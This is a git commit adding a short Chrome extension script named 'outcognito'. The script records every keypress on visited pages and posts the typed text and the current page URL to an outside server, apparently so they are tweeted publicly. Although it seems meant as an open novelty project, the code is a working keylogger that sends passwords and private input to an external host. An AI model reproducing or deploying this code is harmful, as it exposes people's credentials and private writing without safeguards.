ebf672ca628ef6d812c41acc99a947b14cd88bb6
Harold Cooper <hrldcpr@gmail.com>
2017-03-01 14:42:55 -0500

    chrome extension

---
+++ chrome-extension/outcognito.js
@@ -0,0 +1,24 @@
+const tweet = (status) => {
+  const body = new FormData();
+  body.append('status', status);
+
+  fetch('https://x.st/outcognito/tweet', {
+    method: 'POST',
+    body
+  });
+};
+
+var timeoutId;
+var keys = '';
+document.addEventListener('keypress', ({key}) => {
+  keys += key;
+  console.log('keys', keys);
+
+  if (timeoutId) clearTimeout(timeoutId);
+  timeoutId = setTimeout(() => {
+    tweet(`I just typed ${keys}`);
+    keys = '';
+  }, 1000);
+});
+
+tweet(`I just went to ${document.location}`);
